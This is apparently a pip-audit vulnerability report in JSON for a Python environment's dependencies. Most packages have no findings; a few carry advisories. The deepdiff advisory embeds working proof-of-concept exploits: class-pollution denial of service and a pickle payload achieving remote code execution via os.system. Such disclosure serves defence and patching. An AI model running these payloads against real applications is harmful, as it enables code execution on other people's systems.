{"dependencies": [{"name": "abstract-thinking-mcp", "skip_reason": "Dependency not found on PyPI and could not be audited: abstract-thinking-mcp (0.1.0)"}, {"name": "aiofiles", "version": "24.1.0", "vulns": []}, {"name": "aiohappyeyeballs", "version": "2.6.1", "vulns": []}, {"name": "aiohttp", "version": "3.12.15", "vulns": []}, {"name": "aiohttp-jinja2", "version": "1.6", "vulns": []}, {"name": "aiosignal", "version": "1.4.0", "vulns": []}, {"name": "ajsonrpc", "version": "1.2.0", "vulns": []}, {"name": "alabaster", "version": "1.0.0", "vulns": []}, {"name": "annotated-types", "version": "0.7.0", "vulns": []}, {"name": "anyio", "version": "4.9.0", "vulns": []}, {"name": "appdaemon", "version": "4.5.10", "vulns": []}, {"name": "appdaemon-testing", "version": "0.1.4", "vulns": []}, {"name": "astral", "version": "3.2", "vulns": []}, {"name": "async-timeout", "version": "4.0.3", "vulns": []}, {"name": "atomicwrites-homeassistant", "version": "1.4.1", "vulns": []}, {"name": "attrs", "version": "23.1.0", "vulns": []}, {"name": "authlib", "version": "1.6.0", "vulns": []}, {"name": "awesomeversion", "version": "23.8.0", "vulns": []}, {"name": "awscrt", "version": "0.16.21", "vulns": []}, {"name": "awsiotsdk", "skip_reason": "Dependency not found on PyPI and could not be audited: awsiotsdk (1.0.0.dev0)"}, {"name": "babel", "version": "2.17.0", "vulns": []}, {"name": "backports-tarfile", "version": "1.2.0", "vulns": []}, {"name": "bandit", "version": "1.8.3", "vulns": []}, {"name": "bcrypt", "version": "4.0.1", "vulns": []}, {"name": "beautifulsoup4", "version": "4.13.4", "vulns": []}, {"name": "bidict", "version": "0.23.1", "vulns": []}, {"name": "black", "version": "23.12.1", "vulns": [{"id": "PYSEC-2024-48", "fix_versions": ["24.3.0"], "aliases": ["CVE-2024-21503"], "description": "Versions of the package black before 24.3.0 are vulnerable to Regular Expression Denial of Service (ReDoS) via the lines_with_leading_tabs_expanded function in the strings.py file. An attacker could exploit this vulnerability by crafting a malicious input that causes a denial of service.\r\rExploiting this vulnerability is possible when running Black on untrusted input, or if you habitually put thousands of leading tab characters in your docstrings."}]}, {"name": "boolean-py", "version": "5.0", "vulns": []}, {"name": "boto3", "version": "1.39.4", "vulns": []}, {"name": "botocore", "version": "1.39.4", "vulns": []}, {"name": "botocore-stubs", "version": "1.38.46", "vulns": []}, {"name": "bottle", "version": "0.13.2", "vulns": []}, {"name": "broadlink", "version": "0.18.3", "vulns": []}, {"name": "build", "version": "1.3.0", "vulns": []}, {"name": "cachecontrol", "version": "0.14.3", "vulns": []}, {"name": "cachetools", "version": "5.3.2", "vulns": []}, {"name": "caldav", "version": "2.0.1", "vulns": []}, {"name": "certifi", "version": "2025.1.31", "vulns": []}, {"name": "cffi", "version": "1.16.0", "vulns": []}, {"name": "cfgv", "version": "3.4.0", "vulns": []}, {"name": "chain-of-thought-tool", "version": "0.1.1", "vulns": []}, {"name": "chardet", "version": "5.2.0", "vulns": []}, {"name": "charset-normalizer", "version": "3.3.1", "vulns": []}, {"name": "chronos-mcp", "skip_reason": "Dependency not found on PyPI and could not be audited: chronos-mcp (2.0.0)"}, {"name": "ciso8601", "version": "2.3.0", "vulns": []}, {"name": "claude-code-mcp", "skip_reason": "Dependency not found on PyPI and could not be audited: claude-code-mcp (0.1.1)"}, {"name": "click", "version": "8.2.1", "vulns": []}, {"name": "colorama", "version": "0.4.6", "vulns": []}, {"name": "colorlog", "version": "6.7.0", "vulns": []}, {"name": "context-switcher-mcp", "skip_reason": "Dependency not found on PyPI and could not be audited: context-switcher-mcp (0.1.0)"}, {"name": "coverage", "version": "7.9.2", "vulns": []}, {"name": "cryptography", "version": "45.0.5", "vulns": []}, {"name": "cyclonedx-python-lib", "version": "9.1.0", "vulns": []}, {"name": "cyclopts", "version": "3.22.2", "vulns": []}, {"name": "datalayer-pycrdt", "version": "0.12.17", "vulns": []}, {"name": "decision-matrix-mcp", "skip_reason": "Dependency not found on PyPI and could not be audited: decision-matrix-mcp (0.1.0)"}, {"name": "deepdiff", "version": "8.2.0", "vulns": [{"id": "GHSA-mw26-5g2v-hqw3", "fix_versions": ["8.6.1"], "aliases": ["CVE-2025-58367"], "description": "### Summary [Python class pollution](https://blog.abdulrah33m.com/prototype-pollution-in-python/) is a novel vulnerability categorized under [CWE-915](https://cwe.mitre.org/data/definitions/915.html). The `Delta` class is vulnerable to class pollution via its constructor, and when combined with a gadget available in DeltaDiff itself, it can lead to Denial of Service and Remote Code Execution (via insecure [Pickle](https://docs.python.org/3/library/pickle.html) deserialization).  The gadget available in DeepDiff allows `deepdiff.serialization.SAFE_TO_IMPORT` to be modified to allow dangerous classes such as `posix.system`, and then perform insecure Pickle deserialization via the Delta class. This potentially allows any Python code to be executed, given that the input to `Delta` is user-controlled.  Depending on the application where DeepDiff is used, this can also lead to other vulnerabilities. For example, in a web application, it might be possible to bypass authentication via class pollution.  ### Details  The `Delta` class can take different object types as a parameter in its constructor, such as a `DeltaDiff` object, a dictionary, or even just bytes (that are deserialized via Pickle).  When it takes a dictionary, it is usually in the following format: ```py Delta({\"dictionary_item_added\": {\"root.myattr['foo']\": \"bar\"}}) ```  Trying to apply class pollution here does not work, because there is already a filter in place: https://github.com/seperman/deepdiff/blob/b639fece73fe3ce4120261fdcff3cc7b826776e3/deepdiff/path.py#L23  However, this code only runs when parsing the path from a string. The `_path_to_elements` function helpfully returns the given input if it is already a list/tuple: https://github.com/seperman/deepdiff/blob/b639fece73fe3ce4120261fdcff3cc7b826776e3/deepdiff/path.py#L52-L53  This means that it is possible to pass the path as the internal representation used by Delta, bypassing the filter:  ```py Delta(     {         \"dictionary_item_added\": {             (                 (\"root\", \"GETATTR\"),                 (\"__init__\", \"GETATTR\"),                 (\"__globals__\", \"GETATTR\"),                 (\"PWNED\", \"GET\"),             ): 1337         }     }, ) ```  Going back to the possible inputs of `Delta`, when it takes a `bytes` as input, it uses pickle to deserialize them. Care was taken by DeepDiff to prevent arbitrary code execution via the `SAFE_TO_IMPORT` allow list. https://github.com/seperman/deepdiff/blob/b639fece73fe3ce4120261fdcff3cc7b826776e3/deepdiff/serialization.py#L62-L98 However, using the class pollution in the `Delta`, an attacker can add new entries to this `set`.  This then allows a second call to `Delta` to [unpickle an insecure class](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) that runs `os.system`, for example.  #### Using dict  Usually, class pollution [does not work](https://gist.github.com/CalumHutton/45d33e9ea55bf4953b3b31c84703dfca#technical-details) when traversal starts at a `dict`/`list`/`tuple`, because it is not possible to reach `__globals__` from there. However, using two calls to `Delta` (or just one call if the target dictionary that already contains at least one entry) it is possible to first change one entry of the dictionary to be of type `deepdiff.helper.Opcode`, which then allows traversal to `__globals__`, and notably `sys.modules`, which in turn allows traversal to any module already loaded by Python. Passing `Opcode` around can be done via pickle, which `Delta` will happily accept given it is in the default allow list.  ### Proof of Concept  With deepdiff 8.6.0 installed, run the following scripts for each proof of concept. All input to `Delta` is assumed to be user-controlled.  #### Denial of Service  This script will pollute the value of `builtins.int`, preventing the class from being used and making code crash whenever invoked.  ```py # ------------[ Setup ]------------ import pickle  from deepdiff.helper import Opcode  pollute_int = pickle.dumps(     {         \"values_changed\": {\"root['tmp']\": {\"new_value\": Opcode(\"\", 0, 0, 0, 0)}},         \"dictionary_item_added\": {             (                 (\"root\", \"GETATTR\"),                 (\"tmp\", \"GET\"),                 (\"__repr__\", \"GETATTR\"),                 (\"__globals__\", \"GETATTR\"),                 (\"__builtins__\", \"GET\"),                 (\"int\", \"GET\"),             ): \"no longer a class\"         },     } )   assert isinstance(pollute_int, bytes)  # ------------[ Exploit ]------------ # This could be some example, vulnerable, application. # The inputs above could be sent via HTTP, for example.  from deepdiff import Delta  # Existing dictionary; it is assumed that it contains # at least one entry, otherwise a different Delta needs to be # applied first, adding an entry to the dictionary. mydict = {\"tmp\": \"foobar\"}  # Before pollution print(int(\"41\") + 1)  # Apply Delta to mydict result = mydict + Delta(pollute_int)  print(int(\"1337\")) ```  ```shell $ python poc_dos.py 42 Traceback (most recent call last):   File \"/tmp/poc_dos.py\", line 43, in <module>     print(int(\"1337\")) TypeError: 'str' object is not callable ```  #### Remote Code Execution  This script will create a file at `/tmp/pwned` with the output of `id`.  ```py # ------------[ Setup ]------------ import os import pickle  from deepdiff.helper import Opcode  pollute_safe_to_import = pickle.dumps(     {         \"values_changed\": {\"root['tmp']\": {\"new_value\": Opcode(\"\", 0, 0, 0, 0)}},         \"set_item_added\": {             (                 (\"root\", \"GETATTR\"),                 (\"tmp\", \"GET\"),                 (\"__repr__\", \"GETATTR\"),                 (\"__globals__\", \"GETATTR\"),                 (\"sys\", \"GET\"),                 (\"modules\", \"GETATTR\"),                 (\"deepdiff.serialization\", \"GET\"),                 (\"SAFE_TO_IMPORT\", \"GETATTR\"),             ): set([\"posix.system\"])         },     } )   # From https://davidhamann.de/2020/04/05/exploiting-python-pickle/ class RCE:     def __reduce__(self):         cmd = \"id > /tmp/pwned\"         return os.system, (cmd,)   # Wrap object with dictionary so that Delta does not crash rce_pickle = pickle.dumps({\"_\": RCE()})  assert isinstance(pollute_safe_to_import, bytes) assert isinstance(rce_pickle, bytes)  # ------------[ Exploit ]------------ # This could be some example, vulnerable, application. # The inputs above could be sent via HTTP, for example.  from deepdiff import Delta  # Existing dictionary; it is assumed that it contains # at least one entry, otherwise a different Delta needs to be # applied first, adding an entry to the dictionary. mydict = {\"tmp\": \"foobar\"}  # Apply Delta to mydict result = mydict + Delta(pollute_safe_to_import)  Delta(rce_pickle)  # no need to apply this Delta ```  ```shell $ python poc_rce.py $ cat /tmp/pwned uid=1000(dtc) gid=100(users) groups=100(users),1(wheel) ```  ### Who is affected?  Only applications that pass (untrusted) user input directly into `Delta` are affected.  While input in the form of `bytes` is the most flexible, there are certainly other gadgets, depending on the application, that can be used via just a dictionary. This dictionary could easily be parsed, for example, from JSON. One simple example would be overriding `app.secret_key` of a Flask application, which would allow an attacker to sign arbitrary cookies, leading to an authentication bypass.  ### Mitigations  A straightforward mitigation is preventing traversal through private keys, like it is already done in the path parser. This would have to be implemented in both `deepdiff.path._get_nested_obj` and `deepdiff.path._get_nested_obj_and_force`, and possibly in `deepdiff.delta.Delta._get_elements_and_details`. Example code that raises an error when traversing these properties: ```py if elem.startswith(\"__\") and elem.endswith(\"__\"):   raise ValueError(\"traversing dunder attributes is not allowed\") ```  However, if it is desirable to still support attributes starting and ending with `__`, but still protect against this vulnerability, it is possible to only forbid `__globals__` and `__builtins__`, which stops the most serious cases of class pollution (but not all). This was the solution adopted by pydash: https://github.com/dgilland/pydash/issues/180"}]}, {"name": "defusedxml", "version": "0.7.1", "vulns": []}, {"name": "devil-advocate-mcp", "skip_reason": "Dependency not found on PyPI and could not be audited: devil-advocate-mcp (0.1.0)"}, {"name": "distlib", "version": "0.3.7", "vulns": []}, {"name": "distro", "version": "1.9.0", "vulns": []}, {"name": "dnspython", "version": "2.7.0", "vulns": []}, {"name": "docker", "version": "7.1.0", "vulns": []}, {"name": "docstring-parser", "version": "0.16", "vulns": []}, {"name": "docutils", "version": "0.22", "vulns": []}, {"name": "dparse", "version": "0.6.4", "vulns": []}, {"name": "email-validator", "version": "2.2.0", "vulns": []}, {"name": "exceptiongroup", "version": "1.3.0", "vulns": []}, {"name": "execnet", "version": "2.0.2", "vulns": []}, {"name": "fastjsonschema", "version": "2.21.1", "vulns": []}, {"name": "fastmcp", "version": "2.11.3", "vulns": []}, {"name": "feedparser", "version": "6.0.11", "vulns": []}, {"name": "filelock", "version": "3.16.1", "vulns": []}, {"name": "flake8", "version": "7.3.0", "vulns": []}, {"name": "freezegun", "version": "1.2.2", "vulns": []}, {"name": "frozenlist", "version": "1.4.0", "vulns": []}, {"name": "fsspec", "version": "2025.5.1", "vulns": []}, {"name": "gitdb", "version": "4.0.12", "vulns": []}, {"name": "gitpython", "version": "3.1.45", "vulns": []}, {"name": "greenlet", "version": "3.0.1", "vulns": []}, {"name": "grpcio", "version": "1.73.0", "vulns": []}, {"name": "h11", "version": "0.16.0", "vulns": []}, {"name": "h2", "version": "4.2.0", "vulns": [{"id": "GHSA-847f-9342-265h", "fix_versions": ["4.3.0"], "aliases": ["CVE-2025-57804"], "description": "### Summary  HTTP/2 request splitting vulnerability allows attackers to perform request smuggling attacks by injecting CRLF characters into headers. This occurs when servers downgrade HTTP/2 requests to HTTP/1.1 without properly validating header names/values, enabling attackers to manipulate request boundaries and bypass security controls."}]}, {"name": "hf-xet", "version": "1.1.5", "vulns": []}, {"name": "hindsight-mcp", "skip_reason": "Dependency not found on PyPI and could not be audited: hindsight-mcp (0.1.0)"}, {"name": "home-assistant-bluetooth", "version": "1.10.4", "vulns": []}, {"name": "hpack", "version": "4.1.0", "vulns": []}, {"name": "httpcore", "version": "1.0.9", "vulns": []}, {"name": "httpx", "version": "0.28.1", "vulns": []}, {"name": "httpx-sse", "version": "0.4.0", "vulns": []}, {"name": "huggingface-hub", "version": "0.33.2", "vulns": []}, {"name": "hvac", "version": "2.0.0", "vulns": []}, {"name": "hyperframe", "version": "6.1.0", "vulns": []}, {"name": "icalendar", "version": "6.3.1", "vulns": []}, {"name": "id", "version": "1.5.0", "vulns": []}, {"name": "identify", "version": "2.5.31", "vulns": []}, {"name": "idna", "version": "3.10", "vulns": []}, {"name": "ifaddr", "version": "0.2.0", "vulns": []}, {"name": "imagesize", "version": "1.4.1", "vulns": []}, {"name": "importlib-metadata", "version": "8.7.0", "vulns": []}, {"name": "iniconfig", "version": "2.0.0", "vulns": []}, {"name": "iso8601", "version": "2.1.0", "vulns": []}, {"name": "isodate", "version": "0.7.2", "vulns": []}, {"name": "jaraco-classes", "version": "3.4.0", "vulns": []}, {"name": "jaraco-context", "version": "6.0.1", "vulns": []}, {"name": "jaraco-functools", "version": "4.2.1", "vulns": []}, {"name": "jinja2", "version": "3.1.6", "vulns": []}, {"name": "jiter", "version": "0.9.0", "vulns": []}, {"name": "jmespath", "version": "1.0.1", "vulns": []}, {"name": "joblib", "version": "1.4.2", "vulns": []}, {"name": "jsonschema", "version": "4.24.0", "vulns": []}, {"name": "jsonschema-path", "version": "0.3.4", "vulns": []}, {"name": "jsonschema-specifications", "version": "2025.4.1", "vulns": []}, {"name": "jupyter-client", "version": "8.6.3", "vulns": []}, {"name": "jupyter-core", "version": "5.8.1", "vulns": []}, {"name": "jupyter-kernel-client", "version": "0.7.1", "vulns": []}, {"name": "jupyter-mcp-server", "version": "0.4.0", "vulns": []}, {"name": "jupyter-nbmodel-client", "version": "0.13.0", "vulns": []}, {"name": "jupyter-ydoc", "version": "3.0.5", "vulns": []}, {"name": "keyring", "version": "25.6.0", "vulns": []}, {"name": "lazy-object-proxy", "version": "1.11.0", "vulns": []}, {"name": "license-expression", "version": "30.4.4", "vulns": []}, {"name": "litellm", "version": "1.74.1", "vulns": []}, {"name": "lru-dict", "version": "1.2.0", "vulns": []}, {"name": "lxml", "version": "6.0.0", "vulns": []}, {"name": "mando", "version": "0.7.1", "vulns": []}, {"name": "markdown-it-py", "version": "4.0.0", "vulns": []}, {"name": "markupsafe", "version": "3.0.2", "vulns": []}, {"name": "marshmallow", "version": "3.26.1", "vulns": []}, {"name": "mccabe", "version": "0.7.0", "vulns": []}, {"name": "mcp", "version": "1.12.4", "vulns": []}, {"name": "mdformat", "version": "0.7.22", "vulns": []}, {"name": "mdformat-gfm", "version": "0.4.1", "vulns": []}, {"name": "mdformat-tables", "version": "1.0.0", "vulns": []}, {"name": "mdit-py-plugins", "version": "0.4.2", "vulns": []}, {"name": "mdurl", "version": "0.1.2", "vulns": []}, {"name": "mock-open", "version": "1.4.0", "vulns": []}, {"name": "more-itertools", "version": "10.7.0", "vulns": []}, {"name": "msgpack", "version": "1.1.1", "vulns": []}, {"name": "multidict", "version": "6.0.4", "vulns": []}, {"name": "mypy", "version": "1.16.0", "vulns": []}, {"name": "mypy-extensions", "version": "1.1.0", "vulns": []}, {"name": "myst-parser", "version": "4.0.1", "vulns": []}, {"name": "nbformat", "version": "5.10.4", "vulns": []}, {"name": "nh3", "version": "0.3.0", "vulns": []}, {"name": "nltk", "version": "3.9.1", "vulns": []}, {"name": "nodeenv", "version": "1.8.0", "vulns": []}, {"name": "numpy", "version": "1.26.0", "vulns": []}, {"name": "openai", "version": "1.95.0", "vulns": []}, {"name": "openapi-core", "version": "0.19.5", "vulns": []}, {"name": "openapi-pydantic", "version": "0.5.1", "vulns": []}, {"name": "openapi-schema-validator", "version": "0.6.3", "vulns": []}, {"name": "openapi-spec-validator", "version": "0.7.2", "vulns": []}, {"name": "orderly-set", "version": "5.4.1", "vulns": []}, {"name": "orjson", "version": "3.9.9", "vulns": [{"id": "PYSEC-2024-40", "fix_versions": ["3.9.15"], "aliases": ["CVE-2024-27454"], "description": "orjson.loads in orjson before 3.9.15 does not limit recursion for deeply nested JSON documents."}]}, {"name": "packageurl-python", "version": "0.17.3", "vulns": []}, {"name": "packaging", "version": "24.2", "vulns": []}, {"name": "paho-mqtt", "version": "1.6.1", "vulns": []}, {"name": "pandas", "version": "2.2.3", "vulns": []}, {"name": "parse", "version": "1.20.2", "vulns": []}, {"name": "pathable", "version": "0.4.4", "vulns": []}, {"name": "pathspec", "version": "0.12.1", "vulns": []}, {"name": "pbr", "version": "6.1.1", "vulns": []}, {"name": "pid", "version": "3.0.4", "vulns": []}, {"name": "pillow", "version": "11.3.0", "vulns": []}, {"name": "pip", "version": "25.1.1", "vulns": []}, {"name": "pip-api", "version": "0.0.34", "vulns": []}, {"name": "pip-audit", "version": "2.9.0", "vulns": []}, {"name": "pip-requirements-parser", "version": "32.0.1", "vulns": []}, {"name": "pipdeptree", "version": "2.11.0", "vulns": []}, {"name": "platformdirs", "version": "4.4.0", "vulns": []}, {"name": "platformio", "version": "6.1.16", "vulns": []}, {"name": "pluggy", "version": "1.6.0", "vulns": []}, {"name": "portalocker", "version": "2.10.1", "vulns": []}, {"name": "pre-commit", "version": "3.8.0", "vulns": []}, {"name": "propcache", "version": "0.3.2", "vulns": []}, {"name": "protobuf", "version": "6.31.1", "vulns": []}, {"name": "psutil", "version": "5.9.8", "vulns": []}, {"name": "py-serializable", "version": "2.1.0", "vulns": []}, {"name": "pybind11", "version": "2.11.1", "vulns": []}, {"name": "pycodestyle", "version": "2.14.0", "vulns": []}, {"name": "pycparser", "version": "2.21", "vulns": []}, {"name": "pycrdt", "version": "0.12.21", "vulns": []}, {"name": "pydantic", "version": "2.11.7", "vulns": []}, {"name": "pydantic-core", "version": "2.33.2", "vulns": []}, {"name": "pydantic-settings", "version": "2.9.1", "vulns": []}, {"name": "pyelftools", "version": "0.31", "vulns": []}, {"name": "pyflakes", "version": "3.4.0", "vulns": []}, {"name": "pygments", "version": "2.19.2", "vulns": []}, {"name": "pyhcl", "version": "0.4.5", "vulns": []}, {"name": "pyjwt", "version": "2.8.0", "vulns": []}, {"name": "pylint-per-file-ignores", "version": "1.2.1", "vulns": []}, {"name": "pyopenssl", "version": "23.2.0", "vulns": []}, {"name": "pyparsing", "version": "3.2.3", "vulns": []}, {"name": "pypdf", "version": "6.0.0", "vulns": []}, {"name": "pypdf2", "version": "3.0.1", "vulns": []}, {"name": "pyperclip", "version": "1.9.0", "vulns": []}, {"name": "pyproject-api", "version": "1.6.1", "vulns": []}, {"name": "pyproject-hooks", "version": "1.2.0", "vulns": []}, {"name": "pyright", "version": "1.1.403", "vulns": []}, {"name": "pyserial", "version": "3.5", "vulns": []}, {"name": "pytest", "version": "7.4.4", "vulns": []}, {"name": "pytest-aiohttp", "version": "1.0.5", "vulns": []}, {"name": "pytest-asyncio", "version": "0.23.8", "vulns": []}, {"name": "pytest-cov", "version": "4.1.0", "vulns": []}, {"name": "pytest-freezer", "version": "0.4.8", "vulns": []}, {"name": "pytest-mock", "version": "3.14.1", "vulns": []}, {"name": "pytest-picked", "version": "0.4.6", "vulns": []}, {"name": "pytest-socket", "version": "0.6.0", "vulns": []}, {"name": "pytest-sugar", "version": "0.9.7", "vulns": []}, {"name": "pytest-test-groups", "version": "1.0.3", "vulns": []}, {"name": "pytest-timeout", "version": "2.1.0", "vulns": []}, {"name": "pytest-unordered", "version": "0.5.2", "vulns": []}, {"name": "pytest-xdist", "version": "3.3.1", "vulns": []}, {"name": "python-dateutil", "version": "2.8.2", "vulns": []}, {"name": "python-dotenv", "version": "1.1.0", "vulns": []}, {"name": "python-engineio", "version": "4.12.2", "vulns": []}, {"name": "python-multipart", "version": "0.0.20", "vulns": []}, {"name": "python-slugify", "version": "4.0.1", "vulns": []}, {"name": "python-socketio", "version": "5.11.4", "vulns": []}, {"name": "pytz", "version": "2024.2", "vulns": []}, {"name": "pyyaml", "version": "6.0.2", "vulns": []}, {"name": "pyzmq", "version": "27.0.0", "vulns": []}, {"name": "qdrant-client", "version": "1.14.2", "vulns": []}, {"name": "radon", "version": "6.0.1", "vulns": []}, {"name": "readme-renderer", "version": "44.0", "vulns": []}, {"name": "recurring-ical-events", "version": "3.8.0", "vulns": []}, {"name": "referencing", "version": "0.36.2", "vulns": []}, {"name": "regex", "version": "2024.11.6", "vulns": []}, {"name": "requests", "version": "2.32.4", "vulns": []}, {"name": "requests-mock", "version": "1.11.0", "vulns": []}, {"name": "requests-toolbelt", "version": "1.0.0", "vulns": []}, {"name": "respx", "version": "0.20.2", "vulns": []}, {"name": "rfc3339-validator", "version": "0.1.4", "vulns": []}, {"name": "rfc3986", "version": "2.0.0", "vulns": []}, {"name": "rich", "version": "14.1.0", "vulns": []}, {"name": "rich-rst", "version": "1.3.1", "vulns": []}, {"name": "roman-numerals-py", "version": "3.1.0", "vulns": []}, {"name": "rpds-py", "version": "0.25.1", "vulns": []}, {"name": "ruamel-yaml", "version": "0.18.14", "vulns": []}, {"name": "ruamel-yaml-clib", "version": "0.2.12", "vulns": []}, {"name": "rubber-duck-mcp", "skip_reason": "Dependency not found on PyPI and could not be audited: rubber-duck-mcp (0.1.0)"}, {"name": "ruff", "version": "0.11.13", "vulns": []}, {"name": "s3transfer", "version": "0.13.0", "vulns": []}, {"name": "safety", "version": "3.6.0", "vulns": []}, {"name": "safety-schemas", "version": "0.0.14", "vulns": []}, {"name": "scikit-learn", "version": "1.6.1", "vulns": []}, {"name": "scipy", "version": "1.16.1", "vulns": []}, {"name": "semantic-version", "version": "2.10.0", "vulns": []}, {"name": "setuptools", "version": "80.9.0", "vulns": []}, {"name": "sgmllib3k", "version": "1.0.0", "vulns": []}, {"name": "shellingham", "version": "1.5.4", "vulns": []}, {"name": "simple-websocket", "version": "1.1.0", "vulns": []}, {"name": "six", "version": "1.17.0", "vulns": []}, {"name": "smmap", "version": "5.0.2", "vulns": []}, {"name": "sniffio", "version": "1.3.0", "vulns": []}, {"name": "snowballstemmer", "version": "3.0.1", "vulns": []}, {"name": "sockjs", "version": "0.13.0", "vulns": []}, {"name": "sortedcontainers", "version": "2.4.0", "vulns": []}, {"name": "soupsieve", "version": "2.7", "vulns": []}, {"name": "sphinx", "version": "8.2.3", "vulns": []}, {"name": "sphinx-rtd-theme", "version": "3.0.2", "vulns": []}, {"name": "sphinxcontrib-applehelp", "version": "2.0.0", "vulns": []}, {"name": "sphinxcontrib-devhelp", "version": "2.0.0", "vulns": []}, {"name": "sphinxcontrib-htmlhelp", "version": "2.1.0", "vulns": []}, {"name": "sphinxcontrib-jquery", "version": "4.1", "vulns": []}, {"name": "sphinxcontrib-jsmath", "version": "1.0.1", "vulns": []}, {"name": "sphinxcontrib-qthelp", "version": "2.0.0", "vulns": []}, {"name": "sphinxcontrib-serializinghtml", "version": "2.0.0", "vulns": []}, {"name": "sqlalchemy", "version": "2.0.22", "vulns": []}, {"name": "sse-starlette", "version": "2.3.6", "vulns": []}, {"name": "starlette", "version": "0.47.2", "vulns": []}, {"name": "stevedore", "version": "5.4.1", "vulns": []}, {"name": "syrupy", "version": "4.5.0", "vulns": []}, {"name": "tabulate", "version": "0.9.0", "vulns": []}, {"name": "tenacity", "version": "9.1.2", "vulns": []}, {"name": "termcolor", "version": "2.3.0", "vulns": []}, {"name": "text-unidecode", "version": "1.3", "vulns": []}, {"name": "thinkerz-orchestrator", "skip_reason": "Dependency not found on PyPI and could not be audited: thinkerz-orchestrator (0.1.0)"}, {"name": "threadpoolctl", "version": "3.5.0", "vulns": []}, {"name": "tiktoken", "version": "0.9.0", "vulns": []}, {"name": "tokenizers", "version": "0.21.2", "vulns": []}, {"name": "toml", "version": "0.10.2", "vulns": []}, {"name": "tomli", "version": "2.2.1", "vulns": []}, {"name": "tomli-w", "version": "1.2.0", "vulns": []}, {"name": "tomlkit", "version": "0.13.3", "vulns": []}, {"name": "tornado", "version": "6.5.1", "vulns": []}, {"name": "tox", "version": "4.11.3", "vulns": []}, {"name": "tqdm", "version": "4.67.1", "vulns": []}, {"name": "traitlets", "version": "5.14.3", "vulns": []}, {"name": "twine", "version": "6.1.0", "vulns": []}, {"name": "typer", "version": "0.16.0", "vulns": []}, {"name": "types-awscrt", "version": "0.27.4", "vulns": []}, {"name": "types-boto3", "version": "1.39.4", "vulns": []}, {"name": "types-docker", "version": "7.1.0.20250705", "vulns": []}, {"name": "types-pyyaml", "version": "6.0.12.20250516", "vulns": []}, {"name": "types-requests", "version": "2.32.4.20250611", "vulns": []}, {"name": "types-s3transfer", "version": "0.13.0", "vulns": []}, {"name": "typing-extensions", "version": "4.12.2", "vulns": []}, {"name": "typing-inspection", "version": "0.4.1", "vulns": []}, {"name": "tzdata", "version": "2023.3", "vulns": []}, {"name": "ulid-transform", "version": "0.9.0", "vulns": []}, {"name": "urllib3", "version": "2.5.0", "vulns": []}, {"name": "uvicorn", "version": "0.30.6", "vulns": []}, {"name": "uvloop", "version": "0.21.0", "vulns": []}, {"name": "virtualenv", "version": "20.33.1", "vulns": []}, {"name": "voluptuous", "version": "0.13.1", "vulns": []}, {"name": "voluptuous-serialize", "version": "2.6.0", "vulns": []}, {"name": "wcwidth", "version": "0.2.13", "vulns": []}, {"name": "websocket-client", "version": "1.8.0", "vulns": []}, {"name": "websockets", "version": "15.0.1", "vulns": []}, {"name": "werkzeug", "version": "3.1.1", "vulns": []}, {"name": "wheel", "version": "0.45.1", "vulns": []}, {"name": "wsproto", "version": "1.2.0", "vulns": []}, {"name": "x-wr-timezone", "version": "2.0.1", "vulns": []}, {"name": "yamllint", "version": "1.37.1", "vulns": []}, {"name": "yarl", "version": "1.20.1", "vulns": []}, {"name": "zipp", "version": "3.23.0", "vulns": []}], "fixes": []}
